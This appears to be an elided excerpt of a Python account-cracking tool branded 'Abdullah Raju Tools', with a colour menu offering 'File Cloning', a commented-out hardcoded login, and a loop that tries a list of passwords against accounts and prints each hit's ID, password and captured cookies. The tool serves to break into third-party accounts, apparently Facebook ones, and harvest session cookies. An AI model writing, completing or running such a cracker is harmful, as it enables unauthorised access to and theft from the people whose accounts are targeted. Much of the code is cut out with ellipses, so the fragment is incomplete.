...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'RAJU' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  Abdullah,  Raju,  Tools"')
...
def login():
	banner()
	RAJUj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	RAJUj('\033[0;97m===============================================')
	RAJU= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if RAJU in ['m']:
		public()
	elif RAJU in ['1']:
		crack_file()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#RAJU
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•RAJU-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
